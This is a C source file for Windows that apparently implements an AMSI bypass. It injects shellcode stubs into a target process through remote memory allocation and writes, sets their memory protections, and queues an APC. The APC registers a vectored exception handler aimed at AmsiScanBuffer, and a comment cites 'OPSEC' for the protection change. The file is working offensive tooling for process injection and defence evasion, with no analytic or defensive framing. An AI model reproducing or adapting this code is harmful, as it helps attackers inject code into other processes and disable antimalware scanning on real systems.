#include <windows.h>
#include <stdio.h>
#include <stdint.h>

// Assume these are generated via xxd from the .bin files
extern unsigned char veh_bin[];
extern unsigned int veh_bin_len;

extern unsigned char apc_bin[];
extern unsigned int apc_bin_len;

// Helper function to scan the shellcode array and patch 8-byte placeholders
BOOL PatchPlaceholder(unsigned char* payload, size_t payloadSize, uint64_t placeholder, uint64_t value) {
    for (size_t i = 0; i < payloadSize - 7; i++) {
        if (*(uint64_t*)(&payload[i]) == placeholder) {
            *(uint64_t*)(&payload[i]) = value;
            return TRUE;
        }
    }
    return FALSE;
}

BOOL ApplyVehBypass(HANDLE hProcess, HANDLE hThread) {
    // 1. Resolve addresses locally. Due to ASLR design on Windows, system DLLs 
    // are mapped at the same base address across all processes in the same session.
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    // Force load amsi.dll locally to get the AmsiScanBuffer offset
    HMODULE hAmsi = LoadLibraryA("amsi.dll"); 

    uint64_t pLoadLibraryA = (uint64_t)GetProcAddress(hKernel32, "LoadLibraryA");
    uint64_t pRtlAddVeh = (uint64_t)GetProcAddress(hNtdll, "RtlAddVectoredExceptionHandler");
    uint64_t pAmsiScanBuffer = (uint64_t)GetProcAddress(hAmsi, "AmsiScanBuffer");

    if (!pLoadLibraryA || !pRtlAddVeh || !pAmsiScanBuffer) {
        printf("[-] Failed to resolve local API addresses.\n");
        return FALSE;
    }

    // 2. Patch VEH Stub Placeholder
    if (!PatchPlaceholder(veh_bin, veh_bin_len, 0xAAAAAAAAAAAAAAAA, pAmsiScanBuffer)) {
        printf("[-] Failed to patch AmsiScanBuffer address in VEH stub.\n");
        return FALSE;
    }

    // 3. Allocate and write VEH Stub (RW -> RX for OPSEC)
    void* pRemoteVeh = VirtualAllocEx(hProcess, NULL, veh_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteVeh) return FALSE;
    WriteProcessMemory(hProcess, pRemoteVeh, veh_bin, veh_bin_len, NULL);
    
    DWORD oldProtect;
    VirtualProtectEx(hProcess, pRemoteVeh, veh_bin_len, PAGE_EXECUTE_READ, &oldProtect);

    // 4. Patch APC Stub Placeholders
    PatchPlaceholder(apc_bin, apc_bin_len, 0xBBBBBBBBBBBBBBBB, pLoadLibraryA);
    PatchPlaceholder(apc_bin, apc_bin_len, 0xCCCCCCCCCCCCCCCC, (uint64_t)pRemoteVeh);
    PatchPlaceholder(apc_bin, apc_bin_len, 0xDDDDDDDDDDDDDDDD, pRtlAddVeh);

    // 5. Allocate and write APC Stub
    void* pRemoteApc = VirtualAllocEx(hProcess, NULL, apc_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteApc) return FALSE;
    WriteProcessMemory(hProcess, pRemoteApc, apc_bin, apc_bin_len, NULL);
    VirtualProtectEx(hProcess, pRemoteApc, apc_bin_len, PAGE_EXECUTE_READ, &oldProtect);

    printf("[+] VEH Handler setup at: 0x%p\n", pRemoteVeh);
    printf("[+] APC Stub setup at: 0x%p\n", pRemoteApc);

    // 6. Queue the APC to the target thread
    // Note: The thread must enter an alertable state (e.g., SleepEx, WaitForSingleObjectEx) 
    // for the APC to fire. If hijacking a newly created suspended thread, it will fire on resume.
    if (!QueueUserAPC((PAPCFUNC)pRemoteApc, hThread, NULL)) {
        printf("[-] Failed to queue APC.\n");
        return FALSE;
    }

    printf("[+] APC queued successfully.\n");
    return TRUE;
}